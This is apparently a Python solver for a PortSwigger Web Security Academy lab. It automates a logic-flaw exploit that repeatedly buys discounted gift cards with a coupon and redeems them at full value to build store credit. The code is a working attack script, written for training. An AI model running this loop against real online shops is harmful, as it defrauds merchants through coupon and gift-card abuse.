#!/usr/bin/env python3
"""
Infinite money logic flaw
PortSwigger Web Security Academy -- Business Logic Vulnerabilities

Companion script for the writeup: 10-infinite-money-logic-flaw.md

What this does:
    Logs in as wiener:peter, unlocks the SIGNUP30 coupon via newsletter
    signup, then loops a six-request cycle that buys a $10 gift card at 30%
    off ($7), redeems it for the full $10, and nets $3 store credit per
    cycle: add gift card -> apply coupon -> checkout (no redirect follow)
    -> GET the confirmation page -> extract and redeem the gift card code
    -> GET /my-account as a sync buffer and CSRF refresh. Runs until the
    balance covers the leather jacket, then buys it.

Usage:
    python 10-infinite-money-logic-flaw.py <lab-url>
    e.g. python 10-infinite-money-logic-flaw.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import httpx


def _get_csrf(client: httpx.Client, url: str) -> str:
    r = client.get(url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def _login(client: httpx.Client, base: str, username: str, password: str) -> None:
    csrf = _get_csrf(client, f"{base}/login")
    client.post(f"{base}/login", data={"csrf": csrf, "username": username, "password": password})


def solve(lab_url: str) -> None:
    c = httpx.Client(follow_redirects=True, timeout=15)
    _login(c, lab_url, "wiener", "peter")

    csrf = _get_csrf(c, f"{lab_url}/")
    c.post(f"{lab_url}/sign-up", data={"csrf": csrf, "email": "test@test.com"})
    print("[*] Signed up for the newsletter to unlock SIGNUP30")

    shop_r = c.get(f"{lab_url}/")
    gc_pid = "2"
    gc_m = re.search(r'(?i)Gift\s*Card</h3>.*?productId=(\d+)', shop_r.text, re.DOTALL)
    if gc_m:
        gc_pid = gc_m.group(1)
    print(f"[*] Gift card product ID: {gc_pid}")

    acct = c.get(f"{lab_url}/my-account")
    csrf_m = re.search(r'name="csrf"\s+value="([^"]+)"', acct.text)
    csrf = csrf_m.group(1) if csrf_m else ""
    bal_m = re.search(r'Store credit: .?(\d+\.\d+)', acct.text)
    print(f"[*] Starting balance: ${bal_m.group(1) if bal_m else '?'}")

    confirm_url = f"{lab_url}/cart/order-confirmation?order-confirmed=true"
    cycle = 0

    for cycle in range(450):
        # 1. Add gift card to cart
        c.post(f"{lab_url}/cart", data={
            "csrf": csrf, "productId": gc_pid,
            "quantity": "1", "redir": "PRODUCT"
        })
        # 2. Apply the 30%-off coupon
        c.post(f"{lab_url}/cart/coupon", data={"csrf": csrf, "coupon": "SIGNUP30"})
        # 3. Checkout -- do NOT follow the redirect; the separate GET below
        #    ensures the gift card code exists by the time it's read
        c.post(f"{lab_url}/cart/checkout", data={"csrf": csrf}, follow_redirects=False)
        # 4. Read the confirmation page as its own request
        confirm_r = c.get(confirm_url)

        # 5. The confirmation page accumulates every gift card code ever
        #    generated, newest first -- always take the FIRST <td> after
        #    the "following gift cards:" marker
        gc_section = (confirm_r.text.split("following gift cards:")[-1]
                      if "following gift cards:" in confirm_r.text
                      else confirm_r.text)
        code_m = re.search(r'<td>([A-Za-z0-9]{10})</td>', gc_section)
        if code_m:
            c.post(f"{lab_url}/gift-card", data={"csrf": csrf, "gift-card": code_m.group(1)})

        # 6. GET /my-account: refreshes the CSRF token (which expires over a
        #    run this long) and acts as a sync buffer between cycles
        acct = c.get(f"{lab_url}/my-account")
        csrf_m = re.search(r'name="csrf"\s+value="([^"]+)"', acct.text)
        if csrf_m:
            csrf = csrf_m.group(1)

        if (cycle + 1) % 50 == 0 or cycle == 0:
            credit_m = re.search(r'Store credit: .?(\d+\.\d+)', acct.text)
            balance = float(credit_m.group(1)) if credit_m else 0
            print(f"[*] Cycle {cycle+1}: balance=${balance:.2f}")
            if balance >= 1337:
                break

    print(f"[*] Loop finished after {cycle+1} cycles -- buying the jacket")
    c.post(f"{lab_url}/cart", data={
        "csrf": csrf, "productId": "1",
        "quantity": "1", "redir": "PRODUCT"
    })
    r = c.post(f"{lab_url}/cart/checkout", data={"csrf": csrf})
    print(f"[*] Checkout response status: {r.status_code}")

    check = c.get(lab_url)
    if "Congratulations" in check.text:
        print(f"[+] Lab solved -- {cycle+1} gift-card/coupon cycles funded the jacket.")
    else:
        print("[-] Not solved yet -- balance may not have reached $1337, inspect /my-account.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
